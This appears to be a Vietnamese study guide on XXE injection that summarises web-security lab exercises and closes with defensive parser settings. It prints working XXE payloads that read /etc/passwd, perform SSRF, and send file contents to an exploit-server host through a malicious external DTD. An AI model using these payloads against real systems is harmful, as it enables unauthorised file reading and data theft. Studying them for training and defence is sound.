# XXE (XML EXTERNAL ENTITY INJECTION) — KIẾN THỨC TỔNG HỢP

## Mục lục
1. [XXE là gì?](#1-xxe-là-gì)
2. [DTD & Entity trong XML](#2-dtd--entity-trong-xml)
3. [Các dạng khai thác XXE](#3-các-dạng-khai-thác-xxe)
4. [Blind XXE](#4-blind-xxe)
5. [XInclude](#5-xinclude)
6. [XXE qua file upload (DOCX/hình ảnh chứa metadata XML)](#6-xxe-qua-file-upload-docxhình-ảnh-chứa-metadata-xml)
7. [Cách phòng chống](#7-cách-phòng-chống)
8. [Danh sách lab liên quan](#8-danh-sách-lab-liên-quan)

## 1. XXE là gì?

XXE (XML External Entity injection) xảy ra khi ứng dụng parse input XML do người dùng cung cấp bằng 1 XML parser **cấu hình không an toàn** (cho phép resolve external entity), cho phép attacker định nghĩa entity trỏ tới tài nguyên bên ngoài (file local, URL nội bộ) và khiến parser "nhúng" nội dung đó vào kết quả xử lý.

## 2. DTD & Entity trong XML

**DTD (Document Type Definition)** định nghĩa cấu trúc hợp lệ của tài liệu XML, có thể khai báo **entity** — biến thay thế dùng lại nhiều lần:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY example "my entity value"> ]>
<stockCheck><productId>&example;</productId></stockCheck>
```
`&example;` sẽ được parser thay thế bằng `"my entity value"`.

**External entity** — trỏ tới tài nguyên bên ngoài thay vì giá trị cố định:
```xml
<!DOCTYPE foo [ <!ENTITY example SYSTEM "file:///etc/passwd"> ]>
```

## 3. Các dạng khai thác XXE

**Đọc file tuỳ ý:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
Nếu response phản chiếu lại giá trị `productId` → nội dung file `/etc/passwd` xuất hiện trong response.

**SSRF qua XXE:** thay vì `file://`, dùng `http://` để khiến server tự gửi request tới địa chỉ nội bộ:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.0.1:8080/admin"> ]>
```

## 4. Blind XXE

Khi response không phản chiếu trực tiếp nội dung entity, dùng kỹ thuật:

**Out-of-band (OOB) qua Burp Collaborator — xác nhận tồn tại:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://abcxyz.oastify.com/"> ]>
```

**OOB qua XML parameter entity** (khi entity thường `&xxe;` bị chặn hoàn toàn nhưng parameter entity `%xxe;` vẫn hoạt động — dùng trong chính DTD, không cần dùng lại trong document body):
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://abcxyz.oastify.com/"> %xxe; ]>
```

**Exfiltrate dữ liệu qua malicious external DTD** (khi không thể đọc trực tiếp response, dùng 1 file DTD do attacker host để định nghĩa chuỗi entity lồng nhau, tự động gửi nội dung file cần đọc ra ngoài qua request HTTP):

File `exploit.dtd` (host trên Exploit Server):
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://EXPLOIT-ID.exploit-server.net/?x=%file;'>">
%eval;
%exfiltrate;
```
Payload gửi tới ứng dụng victim:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://EXPLOIT-ID.exploit-server.net/exploit.dtd"> %xxe; ]>
<stockCheck><productId>1</productId></stockCheck>
```
Server victim fetch DTD ngoài, thực thi chuỗi entity lồng nhau → tự đọc file `/etc/passwd`, base64-encode, rồi tự gửi HTTP request chứa nội dung đó tới Exploit Server → attacker đọc được qua Access log.

**Retrieve data via error messages:** thiết kế DTD external khiến parser cố tình gây lỗi có chứa nội dung file cần đọc trong thông báo lỗi (ví dụ khai báo entity trỏ tới tên file không tồn tại được build từ nội dung file thật, khiến lỗi "file not found: <nội dung file>" bị trả về response):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

## 5. XInclude

Khi không kiểm soát được toàn bộ document XML (chỉ 1 phần dữ liệu được nhúng vào XML lớn hơn ở phía server, không thể tự khai báo `DOCTYPE`), có thể dùng **XInclude** — 1 phần của chuẩn XML cho phép nhúng nội dung từ nguồn khác ngay trong nội dung (không cần khai báo DTD):
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## 6. XXE qua file upload (DOCX/hình ảnh chứa metadata XML)

Nhiều định dạng file phổ biến (DOCX, XLSX, SVG, PDF metadata) thực chất là **XML** bên trong (DOCX là file ZIP chứa nhiều file XML). Nếu server dùng thư viện xử lý các định dạng này (ví dụ thư viện đọc metadata ảnh) và thư viện đó parse XML không an toàn, upload 1 file "hợp lệ" nhưng chứa payload XXE trong phần XML nội bộ vẫn có thể khai thác được, dù chức năng chính là "upload ảnh" chứ không phải "nhập XML" trực tiếp.

## 7. Cách phòng chống

- **Tắt hoàn toàn hỗ trợ external entity và DTD** trong cấu hình XML parser (hầu hết ngôn ngữ/thư viện hiện đại đều có tuỳ chọn disable, ví dụ Java: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`).
- Nếu bắt buộc phải hỗ trợ DTD, dùng chế độ "static DTD"/whitelist nghiêm ngặt, không cho phép entity trỏ ra ngoài.
- Validate/sanitize file upload ở tầng nội dung XML thực tế (không chỉ tin đuôi file), đặc biệt với định dạng như SVG, DOCX.
- Cập nhật thư viện xử lý XML/Office document lên phiên bản mới nhất (nhiều lỗi XXE trong thư viện đã được vá).

## 8. Danh sách lab liên quan

1. Exploiting XXE using external entities to retrieve files
2. Exploiting XXE to perform SSRF attacks
3. Blind XXE with out-of-band interaction
4. Blind XXE with out-of-band interaction via XML parameter entities
5. Exploiting blind XXE to exfiltrate data using a malicious external DTD
6. Exploiting blind XXE to retrieve data via error messages
7. Exploiting XInclude to retrieve files
8. Exploiting XXE via image file upload
9. Exploiting XXE to retrieve data by repurposing a local DTD

